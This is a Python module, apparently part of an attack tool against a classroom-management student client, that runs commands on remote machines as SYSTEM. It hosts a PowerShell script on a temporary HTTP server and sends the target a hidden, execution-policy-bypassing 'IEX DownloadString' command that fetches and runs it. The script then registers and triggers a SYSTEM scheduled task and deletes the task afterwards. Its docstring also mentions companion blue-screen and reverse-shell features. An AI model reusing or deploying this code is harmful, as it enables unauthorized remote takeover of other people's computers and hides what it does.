"""以系统权限执行远程命令：把命令注册成一次性计划任务。

远程命令通道一条报文只装得下一百多个字符，也不自带任何提权手段。要让命令以
SYSTEM 身份运行，做法与蓝屏、反弹终端一致：本机临时 HTTP 服务提供一段脚本，
下发的那条命令只负责取回并执行它；脚本把用户命令写进批处理文件，再注册一个
以 SYSTEM 运行的一次性计划任务并立即触发。

计划任务以 SYSTEM 身份注册需要调用方具备相应权限：目标端学生端以管理员或
SYSTEM 运行时才登记成功，普通用户令牌会被系统拒绝，命令本身仍按原样保留在
批处理里，便于失败后查看。执行输出写到批处理旁边的 ``out.txt``。
"""

from base64 import b64encode
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from threading import Event, Lock, Thread, Timer

from app.packets.codec import pkg_sendlist
from app.system.net.local import detect_local_ip

# 脚本路径取短名，把命令长度留给地址与端口。
SCRIPT_PATH = "/e.ps1"
# 任务名固定，同一台目标上重复执行只留一个任务，跑完即删。
TASK_NAME = "JiYuElev"
# 脚本与输出都放公共目录：路径无空格，普通用户也有写权限。
WORK_DIR_NAME = "jyelev"
# 等任务跑完的上限：命令再慢也不至于卡住脚本，超时就照删任务。
TASK_WAIT_SECONDS = 20
# 轮询间隔：任务一结束就能收尾，短命令通常一秒内删掉任务。
TASK_POLL_MILLISECONDS = 500
SERVE_SECONDS = 60
WAIT_SECONDS = 30

_SERVER = None
_SERVER_LOCK = Lock()


def elevated_script(command):
    """返回目标端执行的 PowerShell 脚本。

    命令正文按 UTF-16LE 转 base64 内嵌，脚本正文因此只有 ASCII 字符，
    目标端用 ``WebClient.DownloadString`` 取回时不会因代码页变成乱码。

    Args:
        command: 需要以系统权限执行的命令。

    Returns:
        str: 脚本全文。

    Raises:
        ValueError: 命令包含 NUL 字符。
    """
    if "\x00" in command:
        raise ValueError("命令不能包含 NUL 字符")
    encoded = b64encode(command.encode("utf-16le")).decode("ascii")
    lines = [
        "$ErrorActionPreference='Continue'",
        "$b='%s'" % encoded,
        "$cmd=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b))",
        "$dir=Join-Path $env:PUBLIC '%s'" % WORK_DIR_NAME,
        "New-Item -ItemType Directory -Force -Path $dir | Out-Null",
        "$bat=Join-Path $dir 'run.bat'",
        "$out=Join-Path $dir 'out.txt'",
        # 批处理用系统 ANSI 代码页写盘，中文命令才不会在任务里变成乱码。
        "$body='@echo off'+[char]13+[char]10+$cmd+' >> \"'+$out+'\" 2>&1'+[char]13+[char]10",
        "[IO.File]::WriteAllText($bat,$body,[Text.Encoding]::Default)",
        # 记早一秒：LastRunTime 只精确到秒，留容差免得同秒启动被判成没跑过。
        "$created=(Get-Date).AddSeconds(-1)",
        # 起始时刻写死在过去，触发只靠 /Run：目标时钟与本机是否同步都不影响。
        "& schtasks /Create /TN '%s' /SC ONCE /ST 00:00 /SD 01/01/2000 "
        "/RL HIGHEST /RU 'NT AUTHORITY\\SYSTEM' /TR $bat /F | Out-Null" % TASK_NAME,
        "& schtasks /Run /TN '%s' | Out-Null" % TASK_NAME,
        # 用秒表而不是比时间戳判断超时：系统时钟被同步校正也不会影响等待。
        "$sw=[Diagnostics.Stopwatch]::StartNew()",
        "$probe=Get-Command Get-ScheduledTask -ErrorAction SilentlyContinue",
        "while($probe -and $sw.Elapsed.TotalSeconds -lt %d){" % TASK_WAIT_SECONDS,
        "  $task=Get-ScheduledTask -TaskName '%s' -ErrorAction SilentlyContinue"
        % TASK_NAME,
        # 状态不再是 Running 且本次确实启动过，就说明命令跑完了，立即收尾。
        "  if($task -and $task.State -ne 'Running' -and $task.LastRunTime -ge $created)"
        "{break}",
        "  Start-Sleep -Milliseconds %d" % TASK_POLL_MILLISECONDS,
        "}",
        # 老系统没有 ScheduledTasks 模块时退回短等待，保证任务来得及启动。
        "if(-not $probe){Start-Sleep -Milliseconds 1000}",
        "& schtasks /Delete /TN '%s' /F | Out-Null" % TASK_NAME,
    ]
    return "\n".join(lines) + "\n"


class ElevatedServer:
    """临时托管的 HTTP 服务：只回同一份脚本，被取走后等超时自关。

    Attributes:
        host: 目标用来回连的本机地址。
        command: 需要以系统权限执行的命令。
    """

    def __init__(self, host, command):
        """初始化服务。

        Args:
            host: 目标回连用的本机 IPv4 地址。
            command: 需要以系统权限执行的命令。
        """
        self.host = host
        self.command = command
        self.script = elevated_script(command)
        self.served = Event()
        self._httpd = None
        self._thread = None
        self._closed = False

    @property
    def url(self):
        """返回目标下载脚本用的地址，未启动时端口为 0。"""
        port = self._httpd.server_address[1] if self._httpd else 0
        return "http://%s:%d%s" % (self.host, port, SCRIPT_PATH)

    @property
    def closed(self):
        """服务是否已经关闭。"""
        return self._closed

    def start(self):
        """开始监听，并在 ``SERVE_SECONDS`` 秒后自动关闭。"""
        body = self.script.encode("utf-8")
        served = self.served

        class Handler(BaseHTTPRequestHandler):
            """任何路径都回同一份脚本，目标取走时记一次。"""

            def do_GET(self):
                self.send_response(200)
                self.send_header("Content-Type", "text/plain; charset=utf-8")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
                served.set()

            def log_message(self, *_args):
                """不往标准错误写访问日志。"""

        self._httpd = ThreadingHTTPServer(("0.0.0.0", 0), Handler)
        self._thread = Thread(
            target=self._httpd.serve_forever,
            kwargs={"poll_interval": 0.1},
            daemon=True,
        )
        self._thread.start()
        timer = Timer(SERVE_SECONDS, self.close)
        # 定时器也是线程，非守护的话界面退出会一直等它。
        timer.daemon = True
        timer.start()

    def wait(self, timeout=WAIT_SECONDS):
        """等目标把脚本取走。

        Args:
            timeout: 最长等待秒数。

        Returns:
            bool: 目标已取回脚本时为 True，超时或提前关闭时为 False。
        """
        return self.served.wait(timeout)

    def close(self):
        """停止监听并等线程退出，可重复调用。"""
        if self._closed:
            return
        self._closed = True
        if self._httpd is not None:
            self._httpd.shutdown()
            self._httpd.server_close()
        if self._thread is not None:
            self._thread.join(1)


def _running_server(target, command):
    """返回托管该命令的服务，命令变了就换一个。

    Args:
        target: 目标地址，用来挑目标回连得到的本机网卡。
        command: 需要以系统权限执行的命令。

    Returns:
        ElevatedServer: 已启动的服务。
    """
    global _SERVER
    host = detect_local_ip(target)
    with _SERVER_LOCK:
        if (
            _SERVER is not None
            and not _SERVER.closed
            and _SERVER.host == host
            and _SERVER.command == command
        ):
            return _SERVER
        if _SERVER is not None:
            _SERVER.close()
        server = ElevatedServer(host, command)
        server.start()
        _SERVER = server
        return server


def elevated_command(target, command):
    """返回下发给目标的那条命令：取回脚本并立即执行。

    Args:
        target: 目标地址，用来挑目标能回连的本机地址。
        command: 需要以系统权限执行的命令。

    Returns:
        str: 一条可以直接走远程命令通道的命令。
    """
    url = _running_server(target, command).url
    return (
        "powershell -w hidden -ExecutionPolicy Bypass -c "
        "\"IEX((New-Object Net.WebClient).DownloadString('%s'))\"" % url
    )


def elevated_packets(target, command):
    """返回以系统权限执行命令所需的报文。

    Args:
        target: 目标地址，用来挑目标能回连的本机地址。
        command: 需要以系统权限执行的命令。

    Returns:
        list[list[int]]: 待发送的命令报文。
    """
    return [pkg_sendlist("-c", elevated_command(target, command))]


def payload_hint():
    """返回载荷说明的中文提示，供 DEBUG 日志使用。

    Returns:
        str: 形如「脚本由本机临时 HTTP 托管…；报文 1 条」。
    """
    return (
        "脚本由本机临时 HTTP 托管，目标取回后注册以 SYSTEM 运行的一次性计划任务"
        "并立即触发，执行输出写到公共目录的 out.txt；报文 1 条"
    )


def wait_for_elevated(timeout=WAIT_SECONDS):
    """等目标取回脚本，供发完就退出的命令行使用。

    Args:
        timeout: 最长等待秒数。

    Returns:
        bool: 目标已取回脚本时为 True。
    """
    with _SERVER_LOCK:
        server = _SERVER
    return server is not None and server.wait(timeout)
